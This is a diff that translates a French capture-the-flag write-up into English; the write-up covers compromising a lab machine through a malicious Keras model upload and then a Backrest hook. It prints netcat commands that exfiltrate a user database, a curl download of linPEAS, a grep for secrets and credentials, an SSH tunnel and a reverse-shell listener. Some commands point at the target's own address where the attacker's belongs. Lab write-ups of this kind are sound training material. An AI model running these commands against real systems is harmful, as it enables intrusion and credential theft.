@@ -1,75 +1,75 @@
 # CTF – Artificial (Writeup)
 
-## Contexte
+## Context
 
-Dans ce challenge, je fais face à une application web permettant l’upload de modèles de machine learning.  
-L’objectif est d’obtenir un accès initial à la machine cible, puis d’escalader mes privilèges jusqu’à obtenir un accès **root**.
+In this challenge I face a web app that lets you upload machine learning models.  
+The goal is to get initial access to the target machine, then escalate privileges up to **root**.
 
-Toutes les informations sensibles ont été volontairement anonymisées pour publication publique.
+All sensitive information has been anonymized on purpose for public release.
 
 ---
 
-## Reconnaissance
+## Recon
 
-Je commence par identifier les services exposés sur la machine cible à l’aide d’un scan réseau :
+I start by identifying the services exposed on the target with a network scan:
 
     nmap -sC -sV -sS 10.10.11.74
 
-Le scan révèle un service HTTP exposé ainsi qu’une interface web permettant l’upload de fichiers de type **.h5** (modèles Keras).
+The scan shows an exposed HTTP service and a web interface that accepts uploads of **.h5** files (Keras models).
 
 ---
 
-## Accès initial – Upload de modèle malveillant
+## Initial access – Malicious model upload
 
-L’application accepte des modèles `.h5`.  
-J’exploite cette fonctionnalité en générant un modèle malveillant contenant un payload exécuté côté serveur.
+The app accepts `.h5` models.  
+I abuse this feature by generating a malicious model carrying a payload that runs server-side.
 
-Après l’upload et le traitement du modèle par l’application, le payload est exécuté et j’obtiens un shell sur la machine distante.
+After the upload and once the app processes the model, the payload runs and I get a shell on the remote machine.
 
-Pour stabiliser le shell obtenu :
+To stabilize the shell:
 
     script /dev/null -c bash
 
 ---
 
-## Récupération de données sensibles
+## Grabbing sensitive data
 
-En explorant le système, je découvre une base de données au format `.db` contenant des informations utilisateurs, notamment des **hashs de mots de passe**.
+Exploring the system, I find a `.db` database holding user information, including **password hashes**.
 
-J’exfiltre cette base vers ma machine avec Netcat.
+I exfiltrate it to my machine with Netcat.
 
-Sur ma machine attaquante :
+On my attacking machine:
 
     nc -lvnp 4445 > users.db
 
-Sur la machine cible :
+On the target:
 
     nc 10.10.11.74 4445 < ./users.db
 
-Une fois la base récupérée, j’identifie un utilisateur valide ainsi qu’un hash de mot de passe.
+Once I have the database, I identify a valid user and a password hash.
 
 ---
 
-## Craquage du mot de passe et accès SSH
+## Cracking the password and SSH access
 
-Je soumets le hash à Crackstation.
-Une fois le mot de passe retrouvé en clair, je peux me connecter en SSH :
+I submit the hash to Crackstation.
+Once the plaintext password is recovered, I can log in over SSH:
 
     ssh gael@10.10.11.74
 
 ---
 
-## Énumération locale
+## Local enumeration
 
-Après connexion SSH, je poursuis l’énumération locale afin d’identifier des vecteurs d’escalade de privilèges.
+After the SSH login, I keep enumerating locally to find privilege escalation vectors.
 
-J’utilise **linPEAS** pour automatiser l’énumération.
+I use **linPEAS** to automate the enumeration.
 
-Sur ma machine :
+On my machine:
 
     python3 -m http.server 8000
 
-Sur la machine cible :
+On the target:
 
     curl http://10.10.11.74:8000/linpeas.sh -o /tmp/linpeas.sh
     chmod +x /tmp/linpeas.sh
@@ -77,78 +77,77 @@ Sur la machine cible :
 
 ---
 
-## Découverte d’un service sensible (Backrest)
+## Finding a sensitive service (Backrest)
 
-L’énumération révèle la présence d’un service interne nommé **Backrest**, ainsi que des fichiers de configuration associés.
+The enumeration reveals an internal service called **Backrest**, along with its config files.
 
-Je recherche des secrets stockés localement :
+I search for secrets stored locally:
 
     grep -RniE "passw|secret|token|apikey|aws_|restic|backrest|pgpass|credential" . 2>/dev/null | head -n 50
 
-Je découvre dans un fichier de configuration (`config.json`) :
-- un compte administrateur (`backrest_root`)
-- un mot de passe stocké sous forme chiffrée (bcrypt)
+In a config file (`config.json`) I find:
+- an admin account (`backrest_root`)
+- a password stored encrypted (bcrypt)
 
 ---
 
-## Craquage du mot de passe Backrest
+## Cracking the Backrest password
 
-Le secret récupéré est encodé et chiffré.  
-Je l’extrais et le casse à l’aide de **Hashcat** (mode bcrypt – 3200).
+The recovered secret is encoded and encrypted.  
+I extract it and crack it with **Hashcat** (bcrypt mode – 3200).
 
-Une fois le mot de passe récupéré, je dispose d’identifiants valides pour Backrest.
+Once I recover the password, I have valid credentials for Backrest.
 
 ---
 
-## Accès à Backrest via tunnel SSH
+## Reaching Backrest through an SSH tunnel
 
-Le service Backrest n’est accessible que sur `localhost` de la machine cible.  
-Je mets donc en place un tunnel SSH (port forwarding local) :
+Backrest is only reachable on the target's `localhost`.  
+So I set up an SSH tunnel (local port forwarding):
 
     ssh -L 9898:127.0.0.1:9898 gael@10.10.11.74
 
-Je peux alors accéder à l’interface Backrest depuis ma machine via :
+I can then reach the Backrest interface from my machine at:
 
     http://localhost:9898
 
-Je m’authentifie avec les identifiants précédemment récupérés.
+I authenticate with the credentials recovered earlier.
 
 ---
 
-## Escalade de privilèges via Backrest
+## Privilege escalation through Backrest
 
-Backrest permet de configurer des **repositories** et des **hooks** exécutés automatiquement lors de certaines actions.
+Backrest lets you configure **repositories** and **hooks** that run automatically on certain actions.
 
-J’abuse de cette fonctionnalité en configurant un hook contenant une commande menant à l’exécution d’un reverse shell avec des privilèges élevés.
+I abuse this by setting up a hook that runs a command leading to a reverse shell with elevated privileges.
 
-Côté attaquant :
+On the attacker side:
 
     nc -lvnp 4444
 
-Après déclenchement de l’action côté Backrest, le hook est exécuté et je récupère un shell **root** sur la machine cible.
+Once the action fires on Backrest, the hook runs and I get a **root** shell on the target.
 
 ---
 
 ## Conclusion
 
-Ce challenge met en évidence :
-- les risques liés à l’upload de fichiers applicatifs mal contrôlés,
-- la dangerosité des services internes exposés uniquement sur localhost,
-- l’impact critique d’une mauvaise gestion des secrets,
-- les risques liés aux hooks exécutés par des services privilégiés.
+This challenge shows:
+- the risk of poorly controlled application file uploads,
+- how dangerous internal services exposed only on localhost can be,
+- the critical impact of poor secret management,
+- the risk of hooks run by privileged services.
 
-L’exploitation combine attaque applicative, exfiltration de données, cracking de mots de passe et escalade de privilèges jusqu’au **root**.
+The exploitation combines an application attack, data exfiltration, password cracking and privilege escalation up to **root**.
 
 ---
 
-## Compétences démontrées
+## Skills demonstrated
 
-- Reconnaissance réseau (Nmap)
-- Exploitation d’upload applicatif
-- Reverse shell et stabilisation
-- Exfiltration de fichiers (Netcat)
-- Craquage de mots de passe (hash / bcrypt)
-- Énumération locale (linPEAS)
-- Tunneling SSH (port forwarding)
-- Escalade de privilèges via service interne
-
+- Network recon (Nmap)
+- Application upload exploitation
+- Reverse shell and stabilization
+- File exfiltration (Netcat)
+- Password cracking (hash / bcrypt)
+- Local enumeration (linPEAS)
+- SSH tunneling (port forwarding)
+- Privilege escalation through an internal service
